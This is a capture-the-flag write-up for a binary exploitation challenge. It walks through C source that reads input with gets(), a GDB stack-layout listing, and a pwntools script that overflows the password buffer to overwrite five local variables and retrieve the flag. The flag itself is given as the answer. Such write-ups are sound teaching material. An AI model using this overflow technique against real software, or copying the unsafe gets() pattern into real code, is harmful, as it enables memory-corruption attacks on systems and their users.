# Checks

### Category: Binary Exploitation

### Description

I made a program to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at `/problems/2021/sanity_checks`  on the shell server, or connect with `nc shell.actf.co 21303`.

### Solution
In this challenge we have the source code, and we can see quite easily that the flag is printed when all the conditions are true.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;

    printf("Enter the secret word: ");

    gets(&password);

    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];

                            FILE *f = fopen("flag.txt","r");

                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }

                            fgets(flag, 128, f);

                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```
Using *GDB*, we can check where local variables are declared in the stack:
```
0x00000000004011b5 <+31>:	mov    rax,QWORD PTR [rip+0x2ee4]        # 0x4040a0 <stderr@GLIBC_2.2.5>
0x00000000004011bc <+38>:	mov    esi,0x0
0x00000000004011c1 <+43>:	mov    rdi,rax
0x00000000004011c4 <+46>:	call   0x401040 <setbuf@plt>
0x00000000004011c9 <+51>:	mov    DWORD PTR [rbp-0x4],0x0
0x00000000004011d0 <+58>:	mov    DWORD PTR [rbp-0x8],0x0
0x00000000004011d7 <+65>:	mov    DWORD PTR [rbp-0xc],0x0
0x00000000004011de <+72>:	mov    DWORD PTR [rbp-0x10],0x0
0x00000000004011e5 <+79>:	mov    DWORD PTR [rbp-0x14],0x0
0x00000000004011ec <+86>:	lea    rdi,[rip+0xe15]        # 0x402008
0x00000000004011f3 <+93>:	mov    eax,0x0
0x00000000004011f8 <+98>:	call   0x401050 <printf@plt>
```
Analyzing disassembled instructions, we can understand that integer local variables are higher in the stack, and we can overwrite them performing an overflow on `password` buffer. We need to script the interaction, so we can give the program `\x00` to terminate the string and pass the `strcmp`. The payload is built using the correct password:

```python
import struct
from pwn import *

host = "shell.actf.co"
port = 21303
conn = remote(host, port)

ways = 50
what = 55
when1 = 245
which = 61
when2 = 17

payload = b"password123" + b"\x00" +  b"a"*64 + p32(when2) + p32(which) + p32(when1) + p32(what) + p32(ways)
f = open("payload.input", "wb")
f.write(payload)
f.close()

print(conn.recv(1000, 1))
conn.sendline(payload)
print(conn.recvline())

conn.interactive()
```
When the script is executed, the program prints the flag

### Flag:
`actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}`

